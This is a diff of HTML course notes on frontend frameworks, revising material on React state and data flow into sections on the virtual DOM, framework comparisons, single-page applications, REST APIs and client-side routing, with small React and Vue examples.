-<h2 class="atx" id="composing-components">Composing Components</h2>
-<p>Components nest. A whole UI is a tree of them.</p>
-<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vrZq5hma0GXU_xAwR9sO92hw8U1C5J8vH2BgCx9ajcTvRiBCL_NpPYi0LlR-3x7lCsIN7KxDcynH4xZy1uawoGF2a6D2eHLE0igkB1kf4kwYGOKmA6ZWcgarZPnbW19i0OeJwwhjT6YNZ7cPxHhRKdJCCXnAnttbgeltgdr7WP_h2bzkZIdMENz1Mu5r4Q6qLD4tiLUScMqeEIRqDRxV8DlEEXhIRDBQ7-9cRv-J_k8NmIMhZqx_3nK5QpOihonM9T5isvV3qVvIqpxIYOMpxbbTbGiDdpByFgXgi"></div>
-<p>Each box is its own reusable component; a <code>TodoList</code> doesn't know or care how many <code>TodoItem</code>s it holds. Control is confined: the list simply hands each task to an item component, and every item keeps its own scope, so each to-do is different even though the component is the same.</p>
-<h2 class="atx" id="state-and-the-data-behind-the-ui">State and the Data Behind the UI</h2>
-<p><strong>State</strong> is the data a component holds onto between renders. It is what the UI is currently showing. Between one render and the next the state stays as it is; whenever it changes, another render happens.</p>
-<ul>
-<li><strong>Not the same as database state:</strong> component state usually lives only in the browser, for as long as the page is open. Clicking Like and seeing a counter go from 56 to 57 does not by itself change anything at the server.</li>
-<li>When state changes, the framework <strong>re-renders whatever part of the UI depends on it, automatically</strong>.</li>
+<li><strong>Imperative style (vanilla JS):</strong> select the element, then <em>separately</em> attach a listener to it.</li>
+<li><strong>Declarative style (frameworks):</strong> write the handler directly where the element is defined, e.g. <code>onClick={...}</code>.</li>
+<li>The event itself has not changed. What has changed is <strong>how directly the handler is tied to the markup it belongs to.</strong></li>
 </ul>
 <table>
 <thead>
 <tr>
-<th>Kind of state</th>
-<th>Meaning</th>
+<th>Style</th>
+<th>How the handler is attached</th>
 <th>Example</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><strong>Local state</strong></td>
-<td>One component's own data</td>
-<td>Whether one task is checked off</td>
+<td>Imperative (vanilla JS)</td>
+<td>Select the element, then attach a listener</td>
+<td><code>el.addEventListener(...)</code></td>
 </tr>
 <tr>
-<td><strong>Shared / lifted state</strong></td>
-<td>Data that several components need, usually held by their common parent instead</td>
-<td>The task list that both the items and a footer count depend on</td>
+<td>Declarative (frameworks)</td>
+<td>Handler written where the element is defined</td>
+<td><code>onClick={...}</code></td>
 </tr>
 </tbody></table>
+<h3 class="atx" id="why-frameworks-the-dom-update-problem">Why Frameworks? The DOM Update Problem</h3>
+<p>Earlier, every direct DOM change (<code>textContent</code>, <code>appendChild</code>, <code>classList</code>) was a <strong>manual instruction to the browser</strong>. In Module 3 this was fine, since it gave a good separation of concerns.</p>
+<ul>
+<li><strong>This gets fragile fast:</strong> a to-do app with 50 tasks means 50 places where state and the DOM can <strong>quietly drift out of sync</strong>. At the scale of modern web apps (millions of pages, fast responses expected), manually managing so many states and their matching UI elements is unrealistic. Each time state changes, <em>you</em> would have to remember every element it touches.</li>
+<li><strong>The framework promise:</strong> <em>describe what the UI should look like for the current state</em>, and let the framework figure out what actually needs to change.</li>
+<li>That is the job of a <strong>rendering engine</strong> like React's virtual DOM.</li>
+</ul>
+<hr>
+<h2 class="atx" id="the-virtual-dom">The Virtual DOM</h2>
+<p>A <strong>virtual DOM</strong> is a lightweight, in-memory description of what the UI should look like, <strong>not</strong> the real browser DOM itself. Think of it as a <strong>digital twin</strong> of the page: you can experiment on the twin cheaply without touching the real thing.</p>
+<p><strong>On a state change</strong> the framework builds a <em>new</em> virtual DOM and compares ("diffs") it against the previous one. <strong>Then</strong> it applies only the <strong>minimal set of real DOM changes</strong> needed, instead of re-drawing everything. The developer does none of this; the framework automates it. This is what makes it safe to just "describe the UI for the current state" without worrying about manually patching the page yourself. The saving is largest when the change is <strong>incremental</strong> (a small difference between the old and new state).</p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vrZZ5k0Z4GHNkVuWTghX0HX4H3b2BjDhFsh1bfFBkonqJSFc934I5HlUO_lRzlJjLxqV2sLCg5e7IRkwCLTZ8AofF3PrJ95qUIoj5bjd0dMLR6vjl96V52bda3QY1ip_VvGJl_7nwwQ8Bnps1NgTv9SVpwN9NnXNAKQG9b4ci-s5BvAdDlUDRZ2_rZMVI68YQ5TB3AVyd7sRQcqyCzLMOBXDtk7MCOLyOGLwQmPqkzw2yRLsUn"></div>
 <blockquote>
-<p><strong>Note for Review:</strong> Do not mix up <em>component state</em> (in the browser, gone when the page closes) with <em>database state</em> (at the back end, persistent). Exams like asking which one survives a page refresh.</p>
+<p><strong>Note for Review — Pro-Tip:</strong> Do not say "the virtual DOM is faster than the DOM". The precise claim is: it <strong>avoids many costly real-DOM operations</strong> by computing the smallest set of changes first. Svelte (below) shows you can reach a similar goal with <em>no</em> virtual DOM at all.</p>
 </blockquote>
-<h2 class="atx" id="a-counter-component-with-state">A Counter Component with State</h2>
-<p> <code>useState</code> is imported from React. Inside <code>Counter</code>, the call <code>useState(0)</code> returns a pair: the current value (<code>count</code>) and a setter (<code>setCount</code>), and the 0 is the initial value. The returned markup shows the count and has two buttons whose <code>onClick</code> handlers call the setter with <code>count + 1</code> and <code>count - 1</code>. Calling a setter is the signal that makes React re-render this component, so the new number appears without any manual DOM update. </p>
-<p></p>
-<p><strong>Counter.jsx</strong></p>
-<pre><code class="fenced-code-block language-jsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span>
-
-<span class="token keyword">function</span> <span class="token function">Counter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
+<hr>
+<h2 class="atx" id="the-framework-landscape">The Framework Landscape</h2>
+<h3 class="atx" id="overview-of-frontend-frameworks">Overview of Frontend Frameworks</h3>
+<table>
+<thead>
+<tr>
+<th>Framework</th>
+<th>Origin</th>
+<th>Core idea</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>React</td>
+<td>Meta (Facebook), 2013</td>
+<td>Components + JSX + a virtual DOM</td>
+</tr>
+<tr>
+<td>Vue</td>
+<td>Evan You, 2014</td>
+<td>HTML-like templates + a reactive data system</td>
+</tr>
+<tr>
+<td>Angular</td>
+<td>Google, 2016 rewrite</td>
+<td>Full TypeScript-based framework, batteries included</td>
+</tr>
+<tr>
+<td>Svelte</td>
+<td>Rich Harris, 2016</td>
+<td>Compiles components away at build time, no virtual DOM at runtime</td>
+</tr>
+</tbody></table>
+<p><em>All four solve the same core problem from different angles: keeping the UI in sync with data, without hand-written DOM code.</em></p>
+<p>Large enterprises invest heavily in these frameworks (Google in Angular, Meta in React), which is why they are robust enough for large-scale business use</p>
+<h3 class="atx" id="react-at-a-glance">React at a Glance</h3>
+<p>In React, the whole task item is a <strong>function</strong> that receives <code>text</code> (the data), <code>done</code> (its status) and <code>onToggle</code> (the event handler). <strong>JSX mixes markup and JavaScript directly; curly braces <code>{}</code> drop back into plain JS</strong>, here to compute a style and read props. A click triggers <code>onToggle</code>, and the style draws a line through the text when the task is done.</p>
+<pre><code class="fenced-code-block language-jsx"><span class="token comment">// TaskItem.jsx</span>
+<span class="token keyword">function</span> <span class="token function">TaskItem</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> text<span class="token punctuation">,</span> done<span class="token punctuation">,</span> onToggle <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token keyword">return</span> <span class="token punctuation">(</span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">
-      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">Count: </span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">
-      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">+1</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">
-      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">-1</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">
-    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>onToggle<span class="token punctuation">}</span></span>
+        <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token literal-property property">textDecoration</span><span class="token operator">:</span> done <span class="token operator">?</span> <span class="token string">'line-through'</span> <span class="token operator">:</span> <span class="token string">'none'</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">
+      </span><span class="token punctuation">{</span>text<span class="token punctuation">}</span><span class="token plain-text">
+    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
   <span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span></code></pre>
-<p></p>
-<p><code>useState(0)</code> gives back the current value and a setter; calling the setter is what tells React to re-render this component.</p>
-<p>Trace of one click on <strong>+1</strong> when <code>count</code> is 0:</p>
-<ol>
-<li>The <code>onClick</code> handler runs <code>setCount(0 + 1)</code>.</li>
-<li>React records the new state, 1, and re-renders <code>Counter</code>.</li>
-<li>The function runs again, this time with <code>count</code> equal to 1, and the paragraph now shows <code>Count: 1</code>.</li>
-</ol>
-<blockquote>
-<p><strong>Note for Review:</strong> Never change <code>count</code> directly (for example <code>count++</code>). The variable would change but React would not be told, so nothing re-renders. Always go through the setter.</p>
-</blockquote>
-<h2 class="atx" id="event-handling-in-modern-frontends">Event Handling in Modern Frontends</h2>
-<p>Recall from DOM manipulation: an <strong>event</strong> is anything that happens in the browser: a click, a keypress, a page load.</p>
+<h3 class="atx" id="vue-at-a-glance">Vue at a Glance</h3>
+<p>Vue keeps markup <strong>closer to plain HTML</strong>. <code>@click</code> <strong>binds an event</strong>, <code>:class</code> <strong>binds an attribute</strong>, and <code>{{ }}</code> <strong>inserts a value</strong>. The data (<code>text</code>, <code>done</code>) is declared with <code>defineProps</code>, and the event the component can raise is declared with <code>defineEmits</code>. The same task item, written in a different dialect.</p>
+<pre><code class="fenced-code-block language-html"><span class="token comment">&lt;!-- TaskItem.vue --&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$emit(<span class="token punctuation">'</span>toggle<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span> <span class="token attr-name">:class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>{ done: done }<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+    {{ text }}
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">setup</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
+<span class="token function">defineProps</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'text'</span><span class="token punctuation">,</span> <span class="token string">'done'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">defineEmits</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'toggle'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre>
+<h3 class="atx" id="choosing-a-framework-pros-and-cons">Choosing a Framework: Pros and Cons</h3>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Pros</th>
+<th>Cons</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>React</td>
+<td>Huge ecosystem and job market; flexible and unopinionated; backed by Meta with long-term support</td>
+<td>JSX and build tooling add a learning curve; routing and state management come from separate libraries</td>
+</tr>
+<tr>
+<td>Vue</td>
+<td>Gentle learning curve; templates read close to plain HTML; router and state management are official, built-in choices</td>
+<td>Smaller ecosystem and hiring pool than React; fewer large enterprise reference deployments</td>
+</tr>
+<tr>
+<td>Angular</td>
+<td>All-in-one: routing, forms, an HTTP client and testing all ship built in; strong fit for large, structured teams</td>
+<td>Steepest learning curve of the four; more boilerplate; heavier bundle size for small projects</td>
+</tr>
+<tr>
+<td>Svelte</td>
+<td>No virtual DOM at runtime, compiles to small, fast vanilla JS; very gentle learning curve</td>
+<td>Smaller ecosystem and job market; fewer third-party component libraries to draw on</td>
+</tr>
+<tr>
+<td>No framework (vanilla JS)</td>
+<td>Zero dependencies, smallest possible bundle, nothing beyond what Module 3 already covered</td>
+<td>You rebuild the DOM-sync problem by hand; manageable for a few widgets, fragile past that</td>
+</tr>
+</tbody></table>
+<p><strong>Framework choice is a trade-off exercise, not a search for one "best" answer.</strong> Which framework wins depends on your requirements, and on who has invested in it and how large its market is. A bigger ecosystem means more libraries and more jobs, while a steeper learning curve means a slower start.</p>
+<hr>
+<h2 class="atx" id="single-page-applications">Single-Page Applications</h2>
+<p>A <strong>single-page application (SPA)</strong> loads <strong>one HTML shell once</strong>, then uses JavaScript to update the page for every later interaction.</p>
+<ul>
+<li><strong>Traditional multi-page site (MPA):</strong> clicking a link asks the server for a <strong>whole new HTML page</strong>. That server round trip is a bottleneck for response time.</li>
+<li><strong>SPA:</strong> clicking a link runs JavaScript that <strong>fetches just the data it needs</strong> and <strong>re-renders part of the existing page</strong>.</li>
+<li>Gmail, Google Maps and most modern dashboards are SPAs. Notice how the browser's loading spinner rarely appears after the first load.</li>
+</ul>
+<h3 class="atx" id="mpa-vs-spa-how-navigation-differs">MPA vs SPA: How Navigation Differs</h3>
+<p><strong>Multi-page application (MPA):</strong> on every click the server sends back a whole new HTML page, so <strong>every navigation reloads the entire page.</strong></p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5wTopiEmZ0G1S3UftYazmLIH94h2gZC1LPc5Qpuf_Kc5hUdeQ6b7itQbKIFdCob2MsPaEXT3qNFh5J8D1AD8JOgYib97Prb0dMuN_8ivrUySR0BF6Q45CCEGefbDnxMBd2OCLurCGeFN1_t6nfj_DTPkJoFd3v2-pvo"></div>
+<p><strong>Single-page application (SPA):</strong> the shell is loaded once, then only small JSON responses travel. <strong>The page itself never reloads; JS re-renders in place.</strong> The JSON is handled on the client side to rebuild just the fragment that needs to change, which saves a lot of overhead.</p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5wDoxiAma0G1T0-Nt5DfM2mJn6IxRJGmBOsGtOqmko3sOtYtmjQQMLzE7qkf6NnKgsIqjKJX9vnASYU2mMg4ccvJRT4eQ0s6X-PzHpMTXoGPnRPGY8vTeXXuaqDoZ3VoRBUMR73CExVRYk3feD5YmkNQSR1devmLAYoQ9eE1Yso9v6FAESKG-RVvgFoFwtdu1OlB_djIqK"></div>
+<p><em>SPAs trade full page reloads for smaller, more frequent data requests handled entirely by client-side JavaScript.</em></p>
+<hr>
+<h2 class="atx" id="apis-and-rest">APIs and REST</h2>
+<h3 class="atx" id="frontend-apps-run-on-apis">Frontend Apps Run on APIs</h3>
+<p>The "fetch JSON data" arrow in the SPA diagram is <strong>literally an API call from the browser to a server.</strong></p>
+<ul>
+<li><strong>API (Application Programming Interface):</strong> a defined way for one program to ask another for data or actions, <strong>without needing to know how it is implemented internally.</strong> APIs give huge reusability: you do not rewrite a service from scratch each time.</li>
+<li>In a web app, that "other program" is almost always a <strong>backend server</strong>, like the PHP or Node.js examples from Module 5. Many public APIs are also available and widely used.</li>
+<li><strong>What is new here?</strong> Not the request-response mechanism (Module 1) or the HTTP methods (already covered). It is <strong>how a frontend component uses that response to update itself.</strong> Each component carries its own MVC and calls the server's APIs, so updates become quick.</li>
+<li>This is the <strong>missing link between component state (this module) and the database (Module 5).</strong></li>
+</ul>
+<h3 class="atx" id="rest-a-shared-convention-for-apis">REST: A Shared Convention for APIs</h3>
+<p><strong>REST (Representational State Transfer)</strong> is a common style for designing APIs around <strong>resources</strong>, things like <code>/api/tasks</code> or <code>/api/students</code>, each identified by its <strong>own URL</strong>. It does not introduce new verbs or a new request-response mechanism. It just gives HTTP's existing methods a <strong>consistent, predictable meaning per resource</strong>, and keeps every request <strong>stateless</strong>: the server does not remember you between calls.</p>
+<table>
+<thead>
+<tr>
+<th>Request (quick recall, not new)</th>
+<th>REST meaning for <code>/api/tasks</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>GET /api/tasks</code></td>
+<td>Read the full list of tasks</td>
+</tr>
+<tr>
+<td><code>GET /api/tasks/5</code></td>
+<td>Read one task by id</td>
+</tr>
+<tr>
+<td><code>POST /api/tasks</code></td>
+<td>Create a new task</td>
+</tr>
+<tr>
+<td><code>PUT /api/tasks/5</code></td>
+<td>Replace/update task 5</td>
+</tr>
+<tr>
+<td><code>DELETE /api/tasks/5</code></td>
+<td>Delete task 5</td>
+</tr>
+</tbody></table>
+<p><em>JSON (JavaScript Object Notation) is the near-universal response format for REST APIs: lightweight, human-readable, and native to JavaScript's own object syntax.</em></p>
+<h3 class="atx" id="fetching-and-rendering-api-data">Fetching and Rendering API Data</h3>
+<p>The same task list from Module 5, now rendered by a <strong>component</strong> instead of server-side HTML. <code>useEffect</code> runs <strong>once when the component first renders</strong>. <code>fetch()</code> calls the REST API, <code>.json()</code> parses the response body, and <code>setTasks</code> <strong>triggers a re-render with the real data.</strong> Notice <code>key={t.id}</code>: it gives each list item a stable identity so the virtual DOM can diff the list correctly.</p>
+<pre><code class="fenced-code-block language-jsx"><span class="token comment">// TaskList.jsx</span>
+<span class="token keyword">import</span> <span class="token punctuation">{</span> useState<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">TaskList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">const</span> <span class="token punctuation">[</span>tasks<span class="token punctuation">,</span> setTasks<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/api/tasks'</span><span class="token punctuation">)</span>
+      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token function">setTasks</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">return</span> <span class="token punctuation">(</span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">
+      </span><span class="token punctuation">{</span>tasks<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">t</span> <span class="token operator">=&gt;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">key</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>t<span class="token punctuation">.</span>id<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token punctuation">{</span>t<span class="token punctuation">.</span>text<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">
+    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>
+  <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<h3 class="atx" id="public-apis-in-the-real-world">Public APIs in the Real World</h3>
+<table>
+<thead>
+<tr>
+<th>Public API</th>
+<th>What it provides</th>
+<th>Typical use case</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Weather (OpenWeatherMap, etc.)</td>
+<td>Current conditions and forecasts as JSON</td>
+<td>A dashboard widget or travel app showing local weather</td>
+</tr>
+<tr>
+<td>Maps (Google Maps, Mapbox)</td>
+<td>Geocoding, directions, map tiles</td>
+<td>Store locators, delivery tracking, ride-hailing apps</td>
+</tr>
+<tr>
+<td>Payments (Stripe, Razorpay)</td>
+<td>Card processing, subscriptions, payouts</td>
+<td>Checkout flows on e-commerce sites</td>
+</tr>
+<tr>
+<td>Social login (Google, GitHub OAuth)</td>
+<td>Identity verification without a new password</td>
+<td>"Sign in with Google" buttons</td>
+</tr>
+<tr>
+<td>Public data (data.gov, REST Countries)</td>
+<td>Open government or reference datasets</td>
+<td>Research tools, comparison sites, dashboards</td>
+</tr>
+</tbody></table>
+<p><em>Most production apps are really just components wired to a handful of REST APIs like these, some built in-house, some borrowed from a public provider.</em> Using one is much like calling a function.</p>
+<hr>
+<h2 class="atx" id="client-side-routing-and-spa-trade-offs">Client-Side Routing and SPA Trade-offs</h2>
+<h3 class="atx" id="client-side-routing">Client-Side Routing</h3>
+<p>An SPA still needs different "pages". A <strong>router</strong> is what makes <code>/dashboard</code> and <code>/settings</code> feel like separate pages <strong>without a reload</strong>.</p>
+<p><strong>The trick:</strong> the browser's <strong>History API</strong> lets JavaScript change the URL shown in the address bar <em>without asking the server for a new page</em>. <strong>The router's job:</strong> watch the URL, and swap in whichever component tree corresponds to it. <strong>Back and forward buttons still work as expected</strong>, because the router listens for those browser events too.</p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vrphrEmq0G1E3UJp641gH4wLEWGC6VWeI2qhbPsnlxn7alxEx5ojiZEnIXI3N5xZUQjJcfvpuMDmUbjYT4EgNii9wTX8h8UuSdQ6WxHnEKQmz9YZ59siYOlN-XfXYjbDTWdlI4ny-t6SZGuNOpkgUO-LBijXi40JMDiXagqbBkbWrPLoNIPewbiNkGrkwdddobPvkoysW7yhfZWtUCtNPpLlgdNfJvt-2FyJj8MqgT-aCI5eShywJgQ-g9wcyiyPnq86rAgR9x4fjGjRzSs66nU4362dL7qhADc-QG16CziaBv9xDvaQT7BNJA6YlOG0S4AQhz-OGLAas3iOAFB6x5cgN9VVm5disLxW"></div>
+<p>Because the framework automates all of this without direct user intervention, response time improves. But, as the second half of these notes shows, that automation also opens new security questions.</p>
+<h3 class="atx" id="spa-trade-offs-benefits-and-drawbacks">SPA Trade-offs: Benefits and Drawbacks</h3>
 <table>
 <thead>
 <tr>
 <th></th>
-<th>Imperative style (vanilla JS)</th>
-<th>Declarative style (frameworks)</th>
+<th>Point</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>How the handler is wired</td>
-<td>Select the element, then <strong>separately</strong> attach a listener to it</td>
-<td>Write the handler <strong>directly where the element is defined</strong>, e.g. <code>onClick={...}</code></td>
+<td><strong>Benefit</strong></td>
+<td>Interactions feel <strong>instant</strong> once the app has loaded; only data moves, not whole pages</td>
 </tr>
 <tr>
-<td>Where the handler lives</td>
-<td>Away from the markup it belongs to</td>
-<td>Right inside the markup it belongs to</td>
+<td><strong>Benefit</strong></td>
+<td>State (like an open sidebar or scroll position) <strong>survives navigation naturally</strong></td>
+</tr>
+<tr>
+<td><strong>Drawback</strong></td>
+<td>The <strong>first load can be heavier</strong>, since more JavaScript ships up front</td>
+</tr>
+<tr>
+<td><strong>Drawback</strong></td>
+<td>Search engines and screen readers <strong>historically</strong> had a harder time with content that only appears after JS runs</td>
 </tr>
 </tbody></table>
-<p>The event itself has not changed. What has changed is <strong>how directly the handler is tied to the markup it belongs to</strong>. That small shift is a game changer for how the work is done, and it makes event handling far more scalable.</p>
-<h2 class="atx" id="one-way-data-flow">One-Way Data Flow</h2>
-<p>The DOM is still a parent and child structure, with grandchildren below. What components add is a rule about who has control: <strong>properties go down, events go up.</strong></p>
-<p> The parent <code>TodoApp</code> owns the tasks array, which is the state. It gives each <code>TodoItem</code> what it needs as props (<code>text</code> and <code>done</code>), so data flows down. The item only displays what it receives. When the user toggles it, the item cannot edit the array itself, so it calls the <code>onToggle()</code> function the parent handed it, and the event bubbles up. The parent then decides what actually changes and re-renders, sending fresh props back down. </p>
-<p></p>
-<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vTph5kma0G1D3-lc823KZ01xX095saT22bSRFcDkR4tUtfTerZHVdtoAPBjvePFUr9ZQeDARgNKgbFX4YJ30PDR9J9cHIOe1CpIV2XyjM2PEVcWt8V6QkBU7ajfSqoPeNT64PwLr2jD66ZHiRR5KX1fM3z4VgRdOqvliM1_qFlngdDbQyS7goG_DHsy45Bf4aHRB62SSBwynQCpqdkxDoix_V7PzF0an6-eemABsDkSwbIjC4FZBzj1p_RlsvP7mx7vRa6_E1iYcxekiWOIfkNf87aY_HzvCtMdJZx8SK_ZYnlvm"></div>
-<p></p>
-<p>The child never edits the parent's state directly. It calls a function the parent handed it, and the parent decides what changes.</p>
+<p><em>Most production SPAs today mix in some server-side rendering specifically to soften that first drawback.</em></p>
+<hr>
+<h2 class="atx" id="beyond-mvc-component-based-architecture">Beyond MVC: Component-Based Architecture</h2>
+<p>Recall Module 4's <strong>MVC</strong>: Model, View and Controller as three separate, <strong>global</strong> layers.</p>
 <ul>
-<li>A child never edits its own props; it only displays them, just as a function should not reach out of its module and mutate its caller's variables.</li>
-<li>Every child has its own scope: they are the same widget with different data. That is why signalling upwards through an event is the convenient route: each child reports what happened to it, and the parent, which can see everything, decides.</li>
-<li>Data moves in only <strong>two well-defined directions</strong>, and nothing beyond them. That is what keeps a large component tree (parents, children, grandchildren) <strong>predictable</strong>.</li>
+<li><strong>Component-based UI takes a different cut:</strong> each component bundles its <em>own little</em> Model (state), View (markup) and Controller (event handlers) together.</li>
+<li><strong>Why the shift:</strong> MVC assumes a fairly linear request-response cycle. Today's interactive UIs update <strong>dozens of times without any "request" at all.</strong> In classic MVC, every state change meant a lot of back-and-forth between Model and View. Components keep that conversation local.</li>
+<li>Other patterns like <strong>MVVM</strong> (Vue, Angular) and <strong>MVI</strong> exist too. All are attempts to fit the same <strong>separation-of-concerns</strong> idea to highly reactive interfaces.</li>
 </ul>
-<p>Trace of ticking one task off:</p>
-<ol>
-<li>The user clicks the checkbox in one <code>TodoItem</code>.</li>
-<li>The item calls <code>onToggle()</code>, the function it was given.</li>
-<li><code>TodoApp</code> updates its tasks array (the state).</li>
-<li>React re-renders, and the changed task arrives at its item with new props, <code>done</code> now true.</li>
-</ol>
+<p>Data in a component tree is <strong>predictable</strong> because it flows in one direction: <strong>properties (props) go down</strong> from parent to child, and <strong>changes go back up as events.</strong> The parent owns the state; the child simply displays what it is given and reports what the user did.</p>
